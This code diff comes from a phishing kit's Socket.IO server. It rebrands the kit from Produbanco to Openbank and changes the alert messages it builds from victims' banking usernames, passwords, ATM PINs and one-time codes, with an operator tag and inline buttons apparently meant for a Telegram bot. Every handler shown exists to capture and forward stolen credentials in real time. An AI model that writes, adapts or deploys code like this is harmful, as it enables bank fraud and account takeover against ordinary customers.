@@ -30,7 +30,7 @@ io.on('connection', (socket) => {
   socket.on('dataForm', ({ usuario, contrasena, claveCajero, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso PRODUBANCO:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n💳 Clave de cajero: ${claveCajero}`;
+    const mensaje = `🔐 RICKSANCHEZ TU PAPA: NUEVO OPENBANK:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -49,7 +49,7 @@ io.on('connection', (socket) => {
   socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔍 El usuario ingresó el siguiente código PRODUBANCO:\n\n🧾 Código: ${codigo}`;
+    const mensaje = `🔍 RICKSANCHEZ TU PAPA: CODIGO OPENBANK:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -68,7 +68,7 @@ io.on('connection', (socket) => {
   socket.on('otpIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `📨 Reintento desde pantalla de error PRODUBANCO:\n\n🧾 Código: ${codigo}`;
+    const mensaje = `📨 RICKSANCHEZ TU PAPA: ERROR DE CODIGO LOGO OPENBANK:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -87,7 +87,7 @@ io.on('connection', (socket) => {
   socket.on('errorlogoForm', ({ usuario, contrasena, claveCajero, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado PRODUBANCO:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n💳 Clave de cajero: ${claveCajero}`;
+    const mensaje = `⚠️ RICKSANCHEZ TU PAPA: ERROR LOGO OPENBANK:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
